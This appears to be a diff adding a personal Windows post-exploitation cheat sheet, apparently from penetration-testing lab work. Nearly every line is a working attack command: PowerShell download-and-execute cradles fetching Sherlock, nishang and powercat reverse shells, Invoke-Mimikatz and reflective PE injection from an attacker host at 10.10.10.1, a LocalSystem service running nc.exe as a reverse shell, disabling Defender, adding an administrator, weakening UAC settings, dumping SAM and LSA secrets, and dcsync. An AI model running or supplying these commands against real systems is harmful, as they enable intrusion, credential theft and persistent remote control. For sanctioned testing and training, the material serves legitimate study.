@@ -1,0 +1,148 @@
+dotNet versions:
+
+> dir %windir%\Microsoft.NET\Framework /AD
+
+
+Powershell version:
+
+> powershell -nop -c (Get-Host).Version
+> powershell -nop -c "if ((Get-Host).Version.Major -eq 2) {Start-Sleep -s 30}"
+
+
+Run sherlock (should use winpeas is its more complete, hmm maybe not as reliable tho?):
+
+> powershell -nop -c "iex(gc \\10.10.10.1\test\win\scripts\Sherlock.ps1 | out-string)"
+
+> powershell -nop -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.1:8080/win/scripts/Sherlock.ps1')"
+
+
+Remeber to check powershell size as results can change during enumeration
+[IntPtr]::size
+
+to call 64-bit from 32-bit shell:
+> C:\Windows\Sysnative\WindowsPowerShell\v1.0\powershell.exe
+> C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+
+> C:\windows\System32\WindowsPowerShell\v1.0\powershell.exe
+
+World writable:
+C:\Windows\System32\spool\drivers\color\
+
+Some more writable paths at:
+* https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md
+
+World readable:
+C:\Windows\System32\drivers\etc\hosts
+
+
+PS 2.0 compatible Reverse shell:
+
+> powershell -nop -c "iex (gc \\10.10.10.1\test\win\scripts\nishang\Shells\Invoke-PowerShellTcp.ps1 | out-string) ; Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.1 -Port 4444"
+> powershell -nop -c "IEX((New-Object Net.WebClient).DownloadString('http://10.10.10.1:8080/win/scripts/powercat.ps1'));powercat -c 10.10.10.1 -p 4444 -ep"
+
+> powershell -nop -c "iex (gc \\10.10.10.1\test\win\scripts\myenum.ps1 | out-string) ; Show-Services"
+
+Powershell execution mode: $ExecutionContext.SessionState.LanguageMode
+
+
+When using powsershell -enc parameter, the command can be encoded with "iconv -f utf8 -t utf16le | base64 -w 0", i.e.:
+* running powershell for: [System.IO.Directory]::GetFiles("\\.\\pipe\\") is encoded to:
+> powershell -nop -enc WwBTAHkAcwB0AGUAbQAuAEkATwAuAEQAaQByAGUAYwB0AG8AcgB5AF0AOgA6AEcAZQB0AEYAaQBsAGUAcwAoACIAXABcAC4AXABcAHAAaQBwAGUAXABcACIAKQA=
+
+
+Check constrained LanguageMode mode:
+> $ExecutionContext.SessionState.LanguageMode
+
+
+Check AppLocker rules:
+> reg query HKLM\Software\Policies\Microsoft\Windows\SrpV2 /s
+> Improt-Module AppLocker ; Get-AppLockerPolicy -Effective -Xml | sc c:\some\file.xml
+
+
+Saved credentials in credman
+> cmdkey /list
+These can be used with:
+> runas /savecred /user:DOMAN\User .... (if does not work, maybe reset required)
+
+
+> net localgroup administrators testy /add
+
+If this account does not work remotely with elevated permissions, it will be needed to set:
+> reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /V LocalAccountTokenFilterPolicy /D 1 /T REG_DWORD /F
+
+In cases where RDP is not possible for PTH, disable remote admin mode:
+> reg add HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa /V DisableRestrictedAdmin /T REG_DWORD /D 0 /F
+
+Check if UAC is enabled, value of 5 is prompt, value of 0 is disable:
+> reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /V ConsentPromptBehaviorAdmin
+
+
+Invoke PE remotely (requires same arch of powershell as the injected binary):
+> IEX((New-Object Net.WebClient).DownloadString('http://10.10.10.1:8080/win/Empire/data/module_source/management/Invoke-ReflectivePEInjection.ps1'))
+> Invoke-ReflectivePEInjection -PEUrl http://10.10.10.1:8080/win/bin/winPEASx86.exe -ExeArgs "help"
+OR
+> Invoke-ReflectivePEInjection -PEBytes ((iwr http://10.10.10.1:8080/win/bin/winPEASx86.exe -usebasicparsing).Content) -ExeArgs "help"
+
+
+To base64 encode a file:
+> [Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\Users\kohsuke\documents\CEH.kdbx'))
+
+
+Firewall
+> netsh advfirewall firewall show rule status=enabled name=all dir=in | findstr /B Rule
+> netsh advfirewall firewall show rule status= enabled name= all dir= out | findstr /B Rule
+
+Rules that dont have a display group (i.e. proably non default) also needs wmi access
+> netsh advfirewall firewall show rule name= all dir= in status= enabled | findstr /b "Rule Group"     (look for lines with empty group)
+> powershell -nop "(Get-NetFirewallRule -Enabled True | where Group -eq $null).DisplayName"
+
+Dump details of non-default fules:
+> powershell -nop "(Get-NetFirewallRule -Enabled True | where Group -eq $null).DisplayName | sort -u | % { netsh advfirewall firewall show rule name= $_ }"
+
+
+Port forwarding through windows:
+> netsh interface portproxy add v4tov4 listenport=4455 listenaddress=192.168.164.10 connectport=445 connectaddress=172.16.164.5
+> netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=192.168.164.10 localport=4455 action=allow remoteip=10.10.10.1
+
+
+
+Non-system services:
+> reg query hklm\system\currentcontrolset\services /s /v /f "ImagePath" | findstr ImagePath | findstr /v /i system32
+
+Non-system signed drivers (I think this misses out unsigned drivers):
+>  Get-WmiObject Win32_PnPSignedDriver | Where-Object {$_.DriverProviderName -notmatch "Microsoft"} | Select DeviceName, DriverVersion, DeviceID
+
+Non-microsoft tasks:
+> schtasks /query /fo csv /nh | findstr /v \Microsoft
+
+Find details of tasks that will be run soon (update 2020 to current year)
+> for /F tokens^=^1 usebackq^ delims^=^" %T IN (`schtasks /FO CSV ^| findstr 2020`) DO schtasks /QUERY /TN "%T" /V /FO LIST
+
+
+ICMP discovery:
+for /L %i in (1,1,255) do @ping -n 1 -w 200 10.5.5.%i > nul && echo 10.5.5.%i is up.
+
+
+Mimikatz:
+> IEX((New-Object Net.WebClient).DownloadString('http://10.10.10.1:8080/win/Empire/data/module_source/credentials/Invoke-Mimikatz.ps1'))
+> Invoke-Mimikatz -Command 'lsadump::sam lsadump::secrets sekurlsa::logonpasswords "vault::cred /patch"'
+> Invoke-Mimikatz -Command 'privilege::debug token::elevate lsadump::sam lsadump::secrets sekurlsa::logonpasswords "vault::cred /patch"'
+> Invoke-Mimikatz -Command '"lsadump::dcsync /domain:htb.local /user:Raziel"'
+
+Disable WindowsDefender
+> Set-MpPreference -DisableRealtimeMonitoring $true
+
+
+Service creation:
+> sc create shell type= own start= auto binpath= "c:\windows\temp\nc.exe 10.10.10.1 4444 -e cmd" obj= LocalSystem password= ""
+> sc create shell type= own start= auto binpath= "c:\windows\system32\rshell.exe" obj= LocalSystem password= ""
+> sc start shell
+> sc sdset shell "D:(A;;FA;;;WD)"
+
+
+Dumping local secrets (security is optional for LSA secrets):
+> reg.exe save hklm\sam sam.save
+> reg.exe save hklm\security security.save
+> reg.exe save hklm\system system.save
+secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
+
